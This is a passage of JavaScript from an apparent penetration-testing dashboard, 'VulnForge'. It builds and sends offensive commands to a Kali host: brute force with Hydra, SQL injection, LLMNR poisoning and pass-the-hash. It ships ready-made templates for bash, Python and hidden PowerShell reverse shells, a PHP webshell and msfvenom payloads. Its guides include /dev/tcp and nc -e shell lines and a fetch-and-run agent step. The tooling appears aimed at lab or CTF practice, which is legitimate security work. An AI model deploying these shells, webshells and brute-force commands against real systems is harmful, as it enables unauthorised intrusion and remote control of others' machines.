        const ex = toolExamples[tool];
        if (ex) {
            exampleText.textContent = ex;
            exampleDiv.classList.remove('hidden');
            hint.textContent = 'click tool for examples';
        } else {
            exampleDiv.classList.add('hidden');
            hint.textContent = 'optional';
        }
    }

    window.launchTool = function (tool) {
        const target = targetInput.value.trim();
        const extraFlags = document.getElementById('extra-flags').value.trim();
        const needsTarget = [
            'gobuster','dirb','wfuzz','ffuf','feroxbuster','nikto','whatweb','wpscan','cewl','wafw00f','cors-check',
            'nmap','masscan','netcat','dnsrecon','curl','socat','testssl',
            'enum4linux','smbclient','smbmap','ldapsearch','bloodhound','evil-winrm','impacket',
            'hydra-ssh','hydra-ftp','sqlmap','responder','burpsuite',
            'xsstrike','dalfox','nuclei'
        ];
        if (needsTarget.includes(tool) && !target) {
            alert('⚠️  Enter a target IP/domain in the "Target_" field first.');
            targetInput.focus();
            return;
        }

        let command = '';
        let description = '';

        switch (tool) {
            // ── Web Recon ──
            case 'gobuster':
                command = `gobuster dir -u http://${target} -w /usr/share/wordlists/dirb/common.txt -t 50 -q`;
                description = 'Gobuster — directory enumeration';
                break;
            case 'dirb':
                command = `dirb http://${target} /usr/share/wordlists/dirb/common.txt`;
                description = 'Dirb — directory brute force';
                break;
            case 'wfuzz':
                command = `wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://${target}/FUZZ`;
                description = 'Wfuzz — web fuzzing';
                break;
            case 'ffuf':
                command = `ffuf -w /usr/share/wordlists/dirb/common.txt -u http://${target}/FUZZ`;
                description = 'Ffuf — fast web fuzzer';
                break;
            case 'feroxbuster':
                command = `feroxbuster -u http://${target} -w /usr/share/wordlists/dirb/common.txt -t 50 --depth 4 --quiet`;
                description = 'Feroxbuster — directory scan (Rust)';
                break;
            case 'nikto':
                command = `nikto -h http://${target}`;
                description = 'Nikto — web vulnerability scanner';
                break;
            case 'whatweb':
                command = `whatweb ${target}`;
                description = 'WhatWeb — technology fingerprinting';
                break;
            case 'wpscan':
                command = `wpscan --url http://${target} --no-update --disable-tls-checks`;
                description = 'Wpscan — WordPress scanner';
                break;
            case 'cewl':
                command = `cewl -d 2 -m 5 -w /tmp/cewl_${target}.txt http://${target} 2>/dev/null; echo "Wordlist saved: /tmp/cewl_${target}.txt"`;
                description = 'Cewl — custom wordlist generator';
                break;

            // ── Network ──
            case 'nmap':
                command = `nmap -p- -sV -sC -O -A --min-rate=1000 -T4 ${target}`;
                description = 'Nmap — aggressive full scan';
                break;
            case 'masscan':
                command = `masscan -p1-65535 --rate=1000 ${target}`;
                description = 'Masscan — mass port scan (65535)';
                break;
            case 'netcat':
                command = `nc -zv ${target} 21 22 23 25 53 80 110 139 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 5985 5986 8080 8443`;
                description = 'Netcat — fast TCP scan (24 ports)';
                break;
            case 'dnsrecon':
                command = `dnsrecon -d ${target}`;
                description = 'Dnsrecon — DNS enumeration';
                break;
            case 'curl':
                command = `curl -s -I -L --user-agent "Mozilla/5.0" http://${target}`;
                description = 'Curl — HTTP headers + redirects';
                break;
            case 'socat':
                command = `echo "╔═ Socat Guide ═╗\n\n# Listen on port (reverse shell catch):\nsocat TCP-LISTEN:4444,fork,reuseaddr -\n\n# Connect back:\nsocat EXEC:/bin/sh TCP:${target}:4444\n\n# Port forward:\nsocat TCP-LISTEN:8080,fork TCP:${target}:80\n\n# SSL wrapper:\nsocat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:localhost:80"`;
                description = 'Socat — TCP/UDP relay & shell';
                break;

            // ── SMB / Windows ──
            case 'enum4linux':
                command = `enum4linux -a ${target}`;
                description = 'Enum4linux — full SMB enumeration';
                break;
            case 'smbclient':
                command = `smbclient -L //${target} -N`;
                description = 'Smbclient — list SMB shares (null session)';
                break;
            case 'evil-winrm':
                command = `echo "Usage:\nevil-winrm -i ${target} -u <user> -p <pass>\nevil-winrm -i ${target} -u <user> -H <hash>\n\n# With kerberos:\nevil-winrm -i ${target} -r <domain> -u <user>@<domain> -p <pass>"`;
                description = 'Evil-WinRM — WinRM shell';
                break;
            case 'impacket':
                command = `echo "╔═ Impacket Suite ═╗\n\npsexec.py <dom>/<user>:<pass>@${target}\nsmbexec.py <dom>/<user>:<pass>@${target}\nwmiexec.py <dom>/<user>:<pass>@${target}\n\n# Pass-the-hash\npsexec.py <dom>/<user>@${target} -hashes LM:NTLM"`;
                description = 'Impacket — psexec/smbexec/wmiexec';
                break;
            case 'smbmap':
                command = `smbmap -H ${target} -u '' -p '' -r . 2>/dev/null || smbmap -H ${target} -u 'guest' -p '' -r .`;
                description = 'Smbmap — SMB share permissions';
                break;
            case 'ldapsearch':
                command = `echo "# LDAP anonymous bind example:\nldapsearch -x -H ldap://${target} -b \"dc=htb,dc=local\" -s sub \"(objectclass=*)\" 2>&1 | head -100\n\n# With creds:\nldapsearch -x -H ldap://${target} -D \"cn=<user>,dc=htb,dc=local\" -w <pass> -b \"dc=htb,dc=local\" -s sub \"(objectclass=*)\""`;
                description = 'Ldapsearch — LDAP enumeration';
                break;
            case 'bloodhound':
                command = `echo "╔═ BloodHound Ingestor ═╗\n\n# Run from Kali (authenticated):\nbloodhound-python -d <domain> -u <user> -p <pass> -ns ${target} -c All\n\n# Run from Kali (with LDAP):\nbloodhound-python -d <domain> -u <user> -p <pass> -dc ${target} -c All\n\n# Output .json files can be imported to BloodHound GUI"`;
                description = 'BloodHound — AD ingestor (python)';
                break;

            // ── Pivoting ──
            case 'ligolo':
                command = `echo "╔════════════════════════════════════════╗\n║  Ligolo-ng — Pivot Tunneling Guide    ║\n╚════════════════════════════════════════╝\n\n[Kali] sudo ip tuntap add user \$(whoami) mode tun ligolo\n[Kali] sudo ip link set ligolo up\n[Kali] ligolo-ng proxy -selfcert\n\n[Target] wget http://${target}:8000/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent\n[Target] ligolo-ng agent -connect ${target}:11601 -ignore-cert\n\n[Proxy] sudo ip route add <subnet>/24 dev ligolo\n[Proxy] session > start"`;
                description = 'Ligolo-ng — pivot agent guide';
                break;
            case 'nc-listener':
                command = `echo "╔════════════════════════════════════════╗\n║  Netcat Listener — Reverse Shell      ║\n╚════════════════════════════════════════╝\n\n[Kali] rlwrap nc -lvnp 4444\n\n[Target Bash] bash -i >& /dev/tcp/${target}/4444 0>&1\n[Target NC] nc -e /bin/sh ${target} 4444\n\n⚠️  Run the listener in a separate terminal."`;
                description = 'NC Listener — reverse shell guide';
                break;
            case 'chisel-client':
                command = `echo "╔═ Chisel Tunnel ═╗\n\n# Server (your Kali):\nchisel server -p 8000 --reverse\n\n# Client (target):\nchisel client ${target}:8000 R:8080:localhost:3000\n\n# Socks proxy:\nchisel client ${target}:8000 R:1080:socks"`;
                description = 'Chisel Client — TCP tunnel guide';
                break;
            case 'proxychains':
                command = `echo "╔═ Proxychains Guide ═╗\n\n# 1. Edit /etc/proxychains4.conf:\n#    socks4 127.0.0.1 9050\n#    http   127.0.0.1 8080\n\n# 2. Start your proxy (e.g. chisel, ssh -D):\nssh -D 9050 user@${target}\n\n# 3. Run through proxy:\nproxychains nmap -sT -Pn 10.0.0.1\nproxychains smbclient -L //10.0.0.2\nproxychains curl http://10.0.0.3:80"`;
                description = 'Proxychains — proxy chain guide';
                break;

            // ── Crypto / Decode ──
            case 'jwt-decode': {
                const token = prompt('🔑 Paste your JWT token:');
                if (!token) return;
                command = `echo "${token}" | cut -d. -f2 2>/dev/null | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "Invalid JWT"`;
                description = 'JWT Decode — token payload';
                break;
            }
            case 'b64-encode': {
                const text = prompt('📝 Text to encode (Base64):');
                if (!text) return;
                command = `echo -n "${text}" | base64 -w0`;
                description = 'Base64 Encode';
                break;
            }
            case 'b64-decode': {
                const b64 = prompt('🔐 Base64 string to decode:');
                if (!b64) return;
                command = `echo "${b64}" | base64 -d 2>/dev/null || echo "Invalid Base64"`;
                description = 'Base64 Decode';
                break;
            }
            case 'john': {
                const hashType = prompt('🔑 Hash mode:\n> Leave empty for auto-detect:', '');
                const mode = hashType.trim() ? `--format=${hashType.trim()}` : '';
                command = `echo "John guide: ${mode || 'auto'}"`;
                description = 'John — hash cracker guide';
                break;
            }
            case 'hashcat': {
                const hcMode = prompt('⚡ Hashcat mode (default 0=MD5):', '0');
                command = `echo "Hashcat mode ${hcMode || 0}"`;
                description = 'Hashcat — GPU hash cracker guide';
                break;
            }

            // ── Exploitation ──
            case 'hydra-ssh':
                command = `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://${target} -t 4`;
                description = 'Hydra SSH — brute force (rockyou)';
                break;
            case 'hydra-ftp':
                command = `hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://${target} -t 4`;
                description = 'Hydra FTP — brute force (rockyou)';
                break;
            case 'sqlmap':
                command = `sqlmap -u http://${target} --batch --random-agent`;
                description = 'Sqlmap — automatic SQL injection';
                break;
            case 'searchsploit':
                command = `searchsploit ${target} 2>/dev/null || echo "[!] No results for: ${target}"`;
                description = 'Searchsploit — exploit search';
                break;
            case 'responder':
                command = `echo "╔═ Responder Guide ═╗\n\n# Start LLMNR/NBT-NS poisoner:\nsudo responder -I eth0 -dwv\n\n# To capture hashes on the network:\n# Target will try to resolve a non-existent host\n# Hashes captured in /usr/share/responder/logs/\n\n# Crack with john:\nsudo john /usr/share/responder/logs/*.txt --wordlist=/usr/share/wordlists/rockyou.txt"`;
                description = 'Responder — LLMNR/NBT-NS poisoning';
                break;
            case 'burpsuite':
                command = `echo "╔═ BurpSuite ═╗\n\n# 1. Launch BurpSuite GUI in Kali:\nburpsuite 2>/dev/null &\n\n# 2. Or from CLI:\njava -jar /opt/burpsuite.jar --collaborator-server 2>/dev/null &\n\n# 3. Proxy config:\n# Browser → 127.0.0.1:8080\n# CA cert → http://burpsuite\n\n# 4. REST API (headless):\njava -jar /opt/burpsuite.jar --project-file=/tmp/project --collaborator-server --config-file=/tmp/config.json 2>/dev/null &\n\n⚠️  BurpSuite runs in Kali GUI session. Use SSH -X if needed."`;
                description = 'BurpSuite — launch & proxy guide';
                break;

            // ── Extract / Compress ──
            case 'unzip':
                command = 'echo "Usage:\nunzip file.zip -d output_dir\nunzip -l file.zip       # list contents\nunzip -p file.zip | cat  # pipe to stdout"';
                description = 'Unzip — extract .zip archives';
                break;
            case 'tar-gz':
                command = 'echo "Usage:\ntar -xzvf archive.tar.gz\ntar -xzvf archive.tgz\ntar -czvf archive.tar.gz /path/to/dir   # create"';
                description = 'Tar.gz — extract .tar.gz / .tgz';
                break;
            case 'tar-xz':
                command = 'echo "Usage:\ntar -xJvf archive.tar.xz\ntar -cJvf archive.tar.xz /path/to/dir   # create"';
                description = 'Tar.xz — extract .tar.xz';
                break;
            case '7z-extract':
                command = 'echo "Usage:\n7z x file.7z\n7z l file.7z        # list contents\n7z a archive.7z /path   # create archive"';
                description = '7z — extract .7z archives';
                break;
            case 'unrar':
                command = 'echo "Usage:\nunrar x file.rar     # extract with full path\nunrar e file.rar     # extract without paths\nunrar l file.rar     # list contents"';
                description = 'Unrar — extract .rar archives';
                break;
            case 'gunzip':
                command = 'echo "Usage:\ngunzip file.gz\ngunzip -k file.gz   # keep original\ngzip -d file.gz     # same as gunzip"';
                description = 'Gunzip — decompress .gz files';
                break;
            case 'bunzip2':
                command = 'echo "Usage:\nbunzip2 file.bz2\nbunzip2 -k file.bz2  # keep original\nbzip2 -d file.bz2   # same as bunzip2"';
                description = 'Bunzip2 — decompress .bz2 files';
                break;

            // ── WAF / IDS ──
            case 'wafw00f':
                command = `wafw00f ${target} -a`;
                description = 'Wafw00f — WAF / IDS fingerprint detection';
                break;
            case 'cors-check':
                command = `for origin in "https://evil.com" "null" "https://${target}" "https://not${target}"; do echo "--- Origin: \$origin ---"; curl -s -I -H "Origin: \$origin" -H "Host: ${target}" http://${target} 2>/dev/null | grep -iE "access-control|origin"; done`;
                description = 'CORS Check — test Access-Control misconfigs';
                break;

            // ── SSL/TLS ──
            case 'testssl':
                command = `echo "╔═ TestSSL.sh Guide ═╗\n\n# Quick check (ciphers + protocols):\ntestssl.sh --quiet ${target}\n\n# Full scan (all tests):\ntestssl.sh --full ${target}\n\n# Check specific vulnerabilities:\ntestssl.sh --heartbleed ${target}\ntestssl.sh --logjam ${target}\n\n# Output to HTML:\ntestssl.sh --htmlfile /tmp/${target}_ssl.html ${target}"`;
                description = 'TestSSL — SSL/TLS security assessment';
                break;

            // ── XSS ──
            case 'xsstrike':
                command = `echo "╔═ XSStrike Guide ═╗\n\n# Basic scan (GET):\nxsstrike -u http://${target} --params\n\n# POST with data:\nxsstrike -u http://${target} --data 'q=test&id=1'\n\n# Crawl + scan:\nxsstrike -u http://${target} --crawl\n\n# With custom headers:\nxsstrike -u http://${target} --headers 'Cookie: session=abc'"`;
                description = 'XSStrike — advanced XSS detection + bypass';
                break;
            case 'dalfox':
                command = `echo "╔═ Dalfox Guide ═╗\n\n# Scan a single URL:\ndalfox url http://${target}/page?q=test\n\n# Scan using a list of URLs:\ndalfox file /tmp/urls.txt\n\n# With custom payload:\ndalfox url http://${target}/search?q=1 --custom-payload '<script>alert(1)</script>'\n\n# Blind XSS:\ndalfox url http://${target} --blind 'https://your.xss.ht' 2>/dev/null || dalfox url http://${target}"`;
                description = 'Dalfox — fast XSS parameter scanner (Go)';
                break;

            // ── Nuclei ──
            case 'nuclei':
                command = `echo "╔═ Nuclei Guide ═╗\n\n# Quick scan (critical + high):\nnuclei -u http://${target} -severity critical,high\n\n# Full scan with all templates:\nnuclei -u http://${target} -t ~/nuclei-templates/ -json -o /tmp/nuclei_${target}.json\n\n# CORS misconfiguration check:\nnuclei -u http://${target} -id cors-misconfiguration\n\n# XSS scan:\nnuclei -u http://${target} -id xss-reflected,xss-stored\n\n# Technology + vulnerability fingerprint:\nnuclei -u http://${target} -tags tech,config"`;
                description = 'Nuclei — template-based vulnerability scanner';
                break;

            default:
                appendOutput(`[!] Unknown tool: "${tool}"`);
                return;
        }

        // Set current tool for report / findings parsing
        if (['nmap', 'gobuster', 'dirb', 'ffuf', 'nikto', 'whatweb', 'wpscan', 'wfuzz', 'feroxbuster', 'cewl', 'dnsrecon', 'curl'].includes(tool)) {
            currentToolRunning = tool;
            pendingTool = tool;      // persists until prompt is detected
            _toolParsed = false;
            outputBuffer = '';
            window._toolTimerLongSet = false;
            clearTimeout(window._toolFinishTimer);
        }

        // Append extra flags if provided
        let finalCommand = command;
        if (extraFlags && tool !== 'cewl' && !description.includes('guide') && !description.includes('Guide') && !description.includes('Usage')) {
            // For tools with a direct target, insert flags before target
            // For others, append at end
            if (command.includes('${target}') && command.indexOf('${target}') > 10) {
                finalCommand = command.replace(/\$\{target\}/, `${extraFlags} ${target}`);
            } else {
                finalCommand = `${command} ${extraFlags}`;
            }
        }

        const sep = '─'.repeat(52);
        appendOutput(`\n${sep}`);
        appendOutput(`  🚀 ${description}`);
        appendOutput(`  🎯 ${target || '(no target needed)'}`);
        if (extraFlags) appendOutput(`  🚩 extra: ${extraFlags}`);
        appendOutput(`  \$ ${finalCommand}`);
        appendOutput(`${sep}`);

        window.sendPredefinedCmd(finalCommand);

        // Auto-focus extra flags for next use
        document.getElementById('extra-flags').focus();
    };

    // ── Delegate tool button events for extra-flags hints ──
    document.addEventListener('mouseover', function (e) {
        const btn = e.target.closest('[onclick*=\"launchTool\"]');
        if (btn) {
            const match = btn.getAttribute('onclick').match(/launchTool\('(\w+)'\)/);
            if (match) updateExtraFlagsHint(match[1]);
        }
    });

    // ── Clear hint when mouse leaves the sidebar ──
    document.getElementById('sidebar').addEventListener('mouseleave', function () {
        // Only clear if the extra flags input isn't focused
        if (document.activeElement !== document.getElementById('extra-flags')) {
            const exampleDiv = document.getElementById('extra-flags-example');
            const hint = document.getElementById('extra-flags-hint');
            // Keep the last example visible but dim it
            hint.textContent = 'hover a tool';
        }
    });

    // ============================================================
    //  TAB SYSTEM
    // ============================================================
    window.switchTab = function (tabName) {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));

        const btns = document.querySelectorAll('.tab-btn');
        const panes = {
            terminal: 0,
            reports: 1,
            scripts: 2,
            bounty: 3,
            aiwriteup: 4,
            hak5: 5,
            automation: 6,
            findings: 7
        };
        if (panes[tabName] !== undefined) {
            btns[panes[tabName]].classList.add('active');
        }
        const el = document.getElementById(`tab-${tabName}`);
        if (el) el.classList.add('active');
    };

    // ============================================================
    //  CATEGORY TOGGLE
    // ============================================================
    window.toggleCategory = function (header) {
        const body = header.nextElementSibling;
        const arrow = header.querySelector('span:first-child');
        if (body.style.display === 'none') {
            body.style.display = '';
            arrow.textContent = '▶';
        } else {
            body.style.display = 'none';
            arrow.textContent = '▼';
        }
    };

    // ============================================================
    //  SCRIPT BUILDER — Templates
    // ============================================================
    const SCRIPT_TEMPLATES = {
        'blank': { lang: 'bash', content: '#!/bin/bash\n\n# Your payload here\n' },

        'bash-rev': { lang: 'bash', content: `#!/bin/bash
# Bash Reverse Shell
# Usage: ./script.sh <LHOST> <LPORT>

LHOST="\${1:-10.10.14.x}"
LPORT="\${2:-4444}"

bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
` },

        'python-rev': { lang: 'python', content: `#!/usr/bin/env python3
# Python3 Reverse Shell
# Usage: python3 script.py <LHOST> <LPORT>

import sys, socket, subprocess, os

LHOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.14.x"
LPORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LHOST, LPORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty
pty.spawn("/bin/bash")
` },

        'php-webshell': { lang: 'php', content: `<?php
// PHP WebShell
// Upload to target and access: http://target/shell.php?cmd=whoami

if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>` },

        'powershell-rev': { lang: 'powershell', content: `# PowerShell Reverse Shell
# Run: powershell -NoP -NonI -W Hidden -Exec Bypass -f script.ps1

$LHOST = "10.10.14.x"
$LPORT = 4444

$c = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT);
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb2 = $sb + "PS " + (pwd).Path + "> ";
    $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sbt,0,$sbt.Length);
    $s.Flush()
}
$c.Close()
` },

        'msfvenom': { lang: 'bash', content: `#!/bin/bash
# Msfvenom Payload Generator
# Usage: ./gen.sh <LHOST> <LPORT> <TYPE>

LHOST="\${1:-10.10.14.x}"
LPORT="\${2:-4444}"
TYPE="\${3:-linux}"

case $TYPE in
    linux)
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev_shell.elf
        ;;
    windows)
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rev_shell.exe
        ;;
    php)
        msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o rev_shell.php
        ;;
    python)
        msfvenom -p python/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o rev_shell.py
        ;;
    *)
        echo "Usage: \$0 <LHOST> <LPORT> <linux|windows|php|python>"
        ;;
esac
echo "[+] Payload generated: rev_shell.\$TYPE"
` }
    };

    let savedScripts = [];

    function loadSavedScripts() {
        try {
            const stored = localStorage.getItem('vulnforge_scripts');
            savedScripts = stored ? JSON.parse(stored) : [];
        } catch { savedScripts = []; }
    }

    function saveSavedScripts() {
        localStorage.setItem('vulnforge_scripts', JSON.stringify(savedScripts));
    }

    window.selectScriptTemplate = function (name) {
        // Update active button
        document.querySelectorAll('.script-template-btn').forEach(b => b.classList.remove('active'));
        event.target.classList.add('active');

        const tmpl = SCRIPT_TEMPLATES[name];
        if (tmpl) {
            scriptEditor.value = tmpl.content;
            document.getElementById('script-lang').textContent = tmpl.lang;
            document.getElementById('script-line-count').textContent = getLineCount(tmpl.content);
            if (!scriptName.value) scriptName.value = name + '.sh';
        }
    };

    window.deployScript = function () {
        if (!ensureConnected()) return;

        const content = scriptEditor.value.trim();
        const name = scriptName.value.trim() || 'payload.sh';
        if (!content) {
            alert('⚠️  Script editor is empty.');
            return;
        }

        // Show deploy log
        deployLog.classList.remove('hidden');
        deployLogText.textContent = '';

        // Escape content for SSH echo
        const escaped = content
            .replace(/\\/g, '\\\\')
            .replace(/`/g, '\\`')
            .replace(/\$/g, '\\$')
            .replace(/"/g, '\\"');

        // Write to file on Kali, make executable, and run
        const cmd = `echo "${escaped}" > /tmp/${name} && chmod +x /tmp/${name} && echo "[+] Written to /tmp/${name}"`;

        deployLogText.textContent += `> Writing script to /tmp/${name}...\n`;
        appendOutput(`\n[*] Deploying script: ${name}`);

        // First write
        ws.send(cmd);

        // Ask if execute
        setTimeout(() => {
            if (confirm(`🚀 Script written to /tmp/${name}.\n\nExecute it now?`)) {
                const execCmd = `cd /tmp && ./${name}`;
                deployLogText.textContent += `> Executing: ${execCmd}\n`;
                appendOutput(`[*] Executing: ${execCmd}`);
                ws.send(execCmd);
            } else {
                deployLogText.textContent += `> Ready at /tmp/${name}\n`;
                appendOutput(`[*] Script saved to /tmp/${name} (not executed)`);
            }
        }, 500);

        showToast(`⬆ Script "${name}" deployed`);
    };

    window.saveScript = function () {
        const content = scriptEditor.value.trim();
        const name = scriptName.value.trim() || 'untitled.sh';
        if (!content) {
            alert('⚠️  Editor is empty.');
            return;
        }
        // Avoid duplicates
        const idx = savedScripts.findIndex(s => s.name === name);
        if (idx >= 0) savedScripts[idx].content = content;
        else savedScripts.push({ name, content, saved: new Date().toLocaleString() });

        saveSavedScripts();
        document.getElementById('script-status').textContent = `✓ saved "${name}"`;
        showToast(`💾 Script "${name}" saved locally`);
    };

    window.loadScript = function () {
        if (savedScripts.length === 0) {
            alert('📂 No saved scripts found.');
            return;
        }
        const list = savedScripts.map((s, i) => `${i + 1}. ${s.name} (${s.saved})`).join('\n');
        const choice = prompt(`📂 Saved scripts:\n\n${list}\n\nEnter number to load:`);
        const idx = parseInt(choice) - 1;
        if (idx >= 0 && idx < savedScripts.length) {
            const s = savedScripts[idx];
            scriptEditor.value = s.content;
            scriptName.value = s.name;
            document.getElementById('script-line-count').textContent = getLineCount(s.content);
            document.getElementById('script-status').textContent = `📂 loaded "${s.name}"`;
            showToast(`📂 Loaded "${s.name}"`);
        }
    };

    // Update line count on edit
    scriptEditor.addEventListener('input', () => {
        document.getElementById('script-line-count').textContent = getLineCount(scriptEditor.value);
    });

    // ============================================================
    //  BOUNTY REPORT GENERATOR
    // ============================================================
    let lastBountyReport = '';

    window.generateBountyReport = function () {
        const target      = document.getElementById('bounty-target').value.trim();
        const vulnType    = document.getElementById('bounty-type').value;
        const severity    = document.getElementById('bounty-severity').value;
        const component   = document.getElementById('bounty-component').value.trim();
        const description = document.getElementById('bounty-description').value.trim();
        const steps       = document.getElementById('bounty-steps').value.trim();
        const impact      = document.getElementById('bounty-impact').value.trim();
        const poc         = document.getElementById('bounty-poc').value.trim();
        const fix         = document.getElementById('bounty-fix').value.trim();

        if (!target) { alert('⚠️  Enter a target URL/IP'); return; }
        if (!description) { alert('⚠️  Enter a description'); return; }

        const date = new Date().toISOString().split('T')[0];
        const sevEmoji = { Critical: '🔴', High: '🟠', Medium: '🟡', Low: '🔵', Info: '⚪' };

        const report = `# 🛡️ Bug Bounty Report

**Target:** \`${target}\`
**Date:** ${date}
**Vulnerability:** ${vulnType}
**Severity:** ${sevEmoji[severity] || '•'} **${severity}**
**Reporter:** VulnForge Dashboard

---

## 📋 Summary

${description}

## 🎯 Affected Component

\`${component || 'N/A'}\`

## 🔄 Steps to Reproduce

${steps || '1. Navigate to the target\n2. Perform the attack\n3. Observe the vulnerability'}

## 💥 Impact

${impact || 'An attacker could exploit this vulnerability to compromise the target system.'}

## 🧪 Proof of Concept

\`\`\`
${poc || 'See attached files or URLs'}
\`\`\`

## 🔧 Recommendation

${fix || 'Apply appropriate security patches and input validation.'}

---

*Report generated by **VulnForge** — ${date}*
`;

        lastBountyReport = report;
        document.getElementById('bounty-preview').textContent = report;
        document.getElementById('btn-download-bounty').disabled = false;
        showToast('📋 Bounty report generated');
    };

    // ============================================================
    //  EXPORT UTILITIES (MD / HTML / PDF)
    // ============================================================

    /**
     * Convert markdown-like text to basic HTML for export.
     */
    function mdToBasicHTML(text) {
        if (!text) return '<p>No content</p>';
        let html = text
            // Escape HTML entities first
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            // Code blocks (```...```)
            .replace(/```(\w*)\n([\s\S]*?)```/g, '<pre><code>$2</code></pre>')
            // Inline code
            .replace(/`([^`]+)`/g, '<code>$1</code>')
            // Headers
            .replace(/^### (.+)$/gm, '<h3>$1</h3>')
            .replace(/^## (.+)$/gm, '<h2>$1</h2>')
            .replace(/^# (.+)$/gm, '<h1>$1</h1>')
            // Bold / italic
            .replace(/\*\*(\S[^*]+)\*\*/g, '<strong>$1</strong>')
            .replace(/\*(\S[^*]+)\*/g, '<em>$1</em>')
            // Links
            .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>')
            // Horizontal rules
            .replace(/^---$/gm, '<hr>')
            // List items
            .replace(/^- (.+)$/gm, '<li>$1</li>')
            // Line breaks
            .replace(/\n\n/g, '</p><p>')
            .replace(/\n/g, '<br>');
        return '<p>' + html + '</p>';
    }

    /**
     * Convert markdown text to HTML for inline display (suggestions).
     * Lighter than mdToBasicHTML — no <p> wrapper, supports numbered lists.
     */
    function mdToHTML(text) {
        if (!text) return '';
        let html = text
            // Escape HTML entities
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            // Inline code (backticks)
            .replace(/`([^`]+)`/g, '<code class="bg-deep text-neon px-1 rounded text-[10px]">$1</code>')
            // Bold
            .replace(/\*\*(\S[^*\n]+)\*\*/g, '<strong class="text-gray-100">$1</strong>')
            // Italic
            .replace(/\*(\S[^*\n]+)\*/g, '<em>$1</em>')
            // Numbered list: "1. text" or "1. **cmd:** text"
            .replace(/^(\d+)\.\s+(.+)$/gm, '<li class="ml-4 list-decimal text-gray-300 mb-1">$2</li>')
            // Bullet list: "- text"
            .replace(/^- (.+)$/gm, '<li class="ml-4 list-disc text-gray-300 mb-1">$1</li>')
            // Links
            .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" class="text-neon/80 underline underline-offset-2">$1</a>')
            // Horizontal rules
            .replace(/^---+$/gm, '<hr class="border-gray-800 my-2">')
            // Double newline = paragraph break
            .replace(/\n\n+/g, '</div><div class="mb-2">')
            // Single newline = line break
            .replace(/\n/g, '<br>');
        // Wrap in a container div (first opening tag added if content starts with <li>)
        if (html.startsWith('<li')) {
            html = '<ol class="list-inside">' + html + '</ol>';
        }
        return '<div class="mb-2">' + html + '</div>';
    }

    /**
     * Build a complete, self-contained HTML document for export or print preview.
     * @param {string}  content   - Raw markdown-like report text
     * @param {string}  title     - Document title
     * @param {string}  type      - 'bounty' | 'writeup' | 'scan'
     * @returns {string} Full HTML page
     */
    function buildExportHTML(content, title, type) {
        const bodyHtml = mdToBasicHTML(content);
        const date = new Date().toISOString().split('T')[0];
        return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${title} — VulnForge</title>
<style>
  :root {
    --bg: #0d1117; --surface: #161b22; --border: #30363d;
    --text: #e6edf3; --text-dim: #8b949e; --accent: #58a6ff;
    --accent2: #3fb950; --font: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
    --mono: 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: var(--bg); color: var(--text); font-family: var(--font);
    padding: 40px 48px; line-height: 1.7; font-size: 14px;
  }
  .header {
    border-bottom: 1px solid var(--border); padding-bottom: 16px; margin-bottom: 24px;
    display: flex; align-items: center; justify-content: space-between;
  }
  .header h1 { font-size: 20px; font-weight: 700; color: var(--accent); }
  .header .meta { font-size: 12px; color: var(--text-dim); font-family: var(--mono); }
  .footer {
    margin-top: 40px; padding-top: 16px; border-top: 1px solid var(--border);
    font-size: 11px; color: var(--text-dim); text-align: center;
  }
  h1, h2, h3, h4 { color: var(--accent); margin: 20px 0 8px; font-weight: 600; }
  h1 { font-size: 22px; }
  h2 { font-size: 18px; border-bottom: 1px solid var(--border); padding-bottom: 4px; }
  h3 { font-size: 15px; }
  p { margin: 8px 0; }
  a { color: var(--accent); text-decoration: underline; }
  pre, code { font-family: var(--mono); background: var(--surface); border-radius: 4px; }
  code { padding: 1px 5px; font-size: 13px; }
  pre { padding: 12px 16px; overflow-x: auto; margin: 12px 0; border: 1px solid var(--border); font-size: 13px; line-height: 1.5; }
  pre code { padding: 0; background: none; }
  hr { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
  li { margin: 4px 0 4px 20px; }
  strong { color: #f0f6fc; }
  @media print {
    body { background: #fff; color: #000; padding: 20px; }
    .header h1 { color: #1f6feb; }
    h1, h2, h3 { color: #1f6feb; }
    pre, code { background: #f6f8fa; border-color: #d0d7de; }
    a { color: #1f6feb; }
    strong { color: #000; }
